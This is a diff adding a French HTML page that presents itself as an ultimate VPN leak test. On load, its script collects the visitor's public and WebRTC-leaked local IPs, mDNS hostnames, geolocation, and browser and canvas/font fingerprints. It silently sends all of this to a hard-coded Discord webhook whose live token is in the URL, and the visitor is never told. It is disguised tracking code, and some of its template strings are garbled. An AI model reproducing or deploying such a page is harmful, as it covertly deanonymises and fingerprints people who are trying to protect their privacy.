@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test VPN Ultime - Niveau NordVPN</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; background: #121212; color: #e0e0e0; line-height: 1.6; }
+        h1 { color: #00ff9d; text-align: center; }
+        pre { background: #1e1e1e; padding: 20px; border-radius: 12px; border: 1px solid #333; white-space: pre-wrap; font-size: 14px; }
+        .warning { color: #ff4444; font-weight: bold; font-size: 1.2em; }
+        .good { color: #00ff9d; font-weight: bold; }
+        .loading { text-align: center; font-size: 1.3em; margin: 40px; }
+    </style>
+</head>
+<body>
+    <h1>🔒 Test VPN ULTIME (Niveau NordVPN)</h1>
+    <p class="loading">Analyse en cours... Patience, on vérifie TOUT.</p>
+    <pre id="result">Initialisation des tests...</pre>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1453526094484340807/Yxx2ikxrHe_y_hZejxwwxFxfBKISLKzV1RwcnjvzR4AovUqrrPtNSJ8xzgNm7dV6W2xZ";
+
+        const info = {
+            "🕐 Timestamp": new Date().toISOString(),
+            "🌐 User Agent": navigator.userAgent,
+            "🗣 Langues": navigator.languages?.join(", ") || navigator.language,
+            "🖥 Plateforme": navigator.platform,
+            "🖼 Écran": `\( {screen.width}x \){screen.height}x${screen.colorDepth}`,
+            "🕖 Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+            "🍪 Cookies": navigator.cookieEnabled,
+            "🔒 Do Not Track": navigator.doNotTrack,
+            "🔗 Référer": document.referrer || "Aucun",
+            "📶 Connexion": navigator.connection ? `\( {navigator.connection.effectiveType} ( \){navigator.connection.downlink} Mbps)` : "Inconnu",
+            "🌍 IPs Publiques": {},
+            "🚨 Fuites WebRTC": [],
+            "🔍 Fuites DNS (hostnames)": [],
+            "🛡️ Détection Proxy/VPN": {},
+            "🖼️ Fingerprint (Canvas)": "En cours...",
+            "🔤 Fingerprint (Fonts)": "En cours...",
+            "🌐 Géolocalisation (ip-api)": {}
+        };
+
+        // Envoi Discord avec embed riche
+        async function sendToDiscord() {
+            const hasLeak = info["🚨 Fuites WebRTC"].length > 0 || info["🔍 Fuites DNS (hostnames)"].length > 0;
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: "VPN Ultimate Tester",
+                        embeds: [{
+                            title: hasLeak ? "⚠️ FUITE DÉTECTÉE !" : "✅ VPN Solide (comme NordVPN)",
+                            description: hasLeak ? "Ton VPN laisse fuiter des infos !" : "Aucune fuite détectée. Bravo !",
+                            color: hasLeak ? 15158332 : 3066993,
+                            fields: Object.entries(info).map(([key, value]) => ({
+                                name: key,
+                                value: Array.isArray(value) ? (value.length === 0 ? "Aucune" : value.join("\n")) :
+                                       typeof value === "object" ? JSON.stringify(value, null, 2) : String(value),
+                                inline: true
+                            })),
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch (e) {
+                document.getElementById("result").textContent += "\n\n❌ Erreur envoi Discord";
+            }
+        }
+
+        // IPs publiques (ultra-redondant)
+        async function fetchPublicIPs() {
+            const services = [
+                { name: "ipify.org (IPv4)", url: "https://api.ipify.org?format=json", json: true, key: "ip" },
+                { name: "ipify.org (IPv6)", url: "https://api6.ipify.org?format=json", json: true, key: "ip" },
+                { name: "icanhazip (IPv4)", url: "https://ipv4.icanhazip.com", json: false },
+                { name: "icanhazip (IPv6)", url: "https://ipv6.icanhazip.com", json: false },
+                { name: "ip-api.com", url: "https://ip-api.com/json/", json: true },
+                { name: "cloudflare trace", url: "https://www.cloudflare.com/cdn-cgi/trace", json: false, parser: t => t.match(/ip=([^\n]+)/)?.[1] },
+                { name: "myip.wtf", url: "https://api.myip.wtf/json", json: true, key: "YourFuckingIPAddress" }
+            ];
+
+            for (const s of services) {
+                try {
+                    const res = await fetch(s.url, { cache: "no-store" });
+                    if (res.ok) {
+                        const text = await res.text();
+                        let ip;
+                        if (s.parser) ip = s.parser(text);
+                        else if (s.json) {
+                            const data = JSON.parse(text);
+                            ip = s.key ? data[s.key] : data.query || data.ip;
+                            if (data.country || data.city) info["🌐 Géolocalisation (ip-api)"].Country = data.country || data.countryCode;
+                            info["🌐 Géolocalisation (ip-api)"].City = data.city || data.regionName;
+                            if (data.proxy !== undefined) info["🛡️ Détection Proxy/VPN"][s.name] = data.proxy ? "Oui (Proxy/VPN détecté)" : "Non";
+                        } else ip = text.trim();
+
+                        if (ip) info["🌍 IPs Publiques"][s.name] = ip;
+                    }
+                } catch {}
+            }
+        }
+
+        // WebRTC ultra-complet (IPv4, IPv6, mDNS hostnames)
+        function detectWebRTC() {
+            return new Promise(resolve => {
+                if (!window.RTCPeerConnection || navigator.userAgent.includes("Firefox") && !navigator.mediaDevices) {
+                    resolve({ ips: [], hosts: [] });
+                    return;
+                }
+
+                const ips = new Set();
+                const hosts = new Set();
+                const servers = [
+                    { urls: "stun:stun.l.google.com:19302" },
+                    { urls: "stun:stun1.l.google.com:19302" },
+                    { urls: "stun:stun2.l.google.com:19302" },
+                    { urls: "stun:global.stun.twilio.com:3478" }
+                ];
+
+                const pc = new RTCPeerConnection({ iceServers: servers });
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+
+                pc.onicecandidate = e => {
+                    if (!e.candidate?.candidate) return;
+                    const cand = e.candidate.candidate;
+
+                    // IP classique
+                    const ipMatch = cand.match(/(\d+\.\d+\.\d+\.\d+)|([a-f0-9:]+:[a-f0-9:]+)/i);
+                    if (ipMatch) ips.add(ipMatch[0]);
+
+                    // mDNS hostname (fuite critique !)
+                    const hostMatch = cand.match(/host ([^.]+)\.local/);
+                    if (hostMatch) hosts.add(hostMatch[1] + ".local");
+                };
+
+                setTimeout(() => {
+                    pc.close();
+                    resolve({ ips: Array.from(ips), hosts: Array.from(hosts) });
+                }, 5000);
+            });
+        }
+
+        // Fingerprint Canvas
+        function getCanvasFingerprint() {
+            const canvas = document.createElement("canvas");
+            const ctx = canvas.getContext("2d");
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("🔒 Test VPN", 2, 15);
+            return canvas.toDataURL();
+        }
+
+        // Fingerprint Fonts (détection basique)
+        function getFontFingerprint() {
+            const fonts = ["Arial", "Courier", "Times New Roman", "Comic Sans MS", "Verdana", "Georgia"];
+            return fonts.map(f => {
+                const span = document.createElement("span");
+                span.style.fontFamily = f;
+                span.innerHTML = "abcdefghijklmnopqrstuvwxyz";
+                document.body.appendChild(span);
+                const width = span.offsetWidth;
+                document.body.removeChild(span);
+                return `${f}: ${width}`;
+            }).join(" | ");
+        }
+
+        // Lancement complet
+        async function runUltimateTest() {
+            document.querySelector(".loading").textContent = "Tests en cours : IPs, WebRTC, DNS, Fingerprint...";
+
+            await fetchPublicIPs();
+
+            const webrtc = await detectWebRTC();
+            info["🚨 Fuites WebRTC"] = webrtc.ips.length ? webrtc.ips : ["Aucune IP détectée"];
+            info["🔍 Fuites DNS (hostnames)"] = webrtc.hosts.length ? webrtc.hosts : ["Aucun hostname local"];
+
+            info["🖼️ Fingerprint (Canvas)"] = getCanvasFingerprint().substring(0, 100) + "...";
+            info["🔤 Fingerprint (Fonts)"] = getFontFingerprint().substring(0, 200) + "...";
+
+            // Affichage final
+            const resultEl = document.getElementById("result");
+            resultEl.textContent = JSON.stringify(info, null, 2);
+
+            if (webrtc.ips.length > 0 || webrtc.hosts.length > 0) {
+                resultEl.innerHTML += `\n\n<span class="warning">⚠️ FUITE CRITIQUE DÉTECTÉE !\nTon IP réelle ou nom d'appareil est visible → Corrige ton VPN !</span>`;
+            } else {
+                resultEl.innerHTML += `\n\n<span class="good">✅ PARFAIT ! Aucune fuite détectée.\nTon VPN est au niveau de NordVPN.</span>`;
+            }
+
+            sendToDiscord();
+        }
+
+        runUltimateTest();
+    </script>
+</body>
+</html>
